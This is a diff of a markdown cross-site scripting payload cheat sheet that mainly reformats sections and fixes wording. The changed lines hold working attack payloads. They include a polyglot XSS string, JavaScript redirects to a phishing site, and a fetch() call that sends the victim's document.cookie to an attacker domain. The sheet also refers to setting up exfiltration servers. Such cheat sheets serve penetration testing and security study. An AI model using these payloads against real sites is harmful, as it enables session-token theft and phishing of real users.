@@ -3,7 +3,7 @@ Cross Site Scripting {XSS}
 
 ## Overview
 
-+ Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it can be interpreted as JavaScript resulting in its execution via the browser 
+Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendred by the browser. 
 
 ## Identification Payloads
 
@@ -193,16 +193,20 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 + Malicious js code for exploit payloads
 
 ### Phishing Redirect
+```
+window.location='https://attackerphishingsite.com'
+```
+```
+window['location']='https://attackerphishingsite.com'
+```
 
-`window.location='https://attackerphishingsite.com'`
-
-`window['location']='https://attackerphishingsite.com'`
-
-`document.location='https://attackerphishingsite.com'`
+```
+document.location='https://attackerphishingsite.com'
+```
 
 ### Exfiltrate Auth Tokens/Cookies
 
-~ Requires attack server ~
+*For use with an [exfiltration/attack server](#exfiltration-servers)*
 
 ```
 fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
@@ -371,7 +375,7 @@ document.addEventlistener('click', () =>
 );
 ```
 
-## Exfiltration Servers/Listeners
+## Exfiltration Servers
 
 + This section aims to document several approaches to setting up an attack server for XSS exfiltration 
 
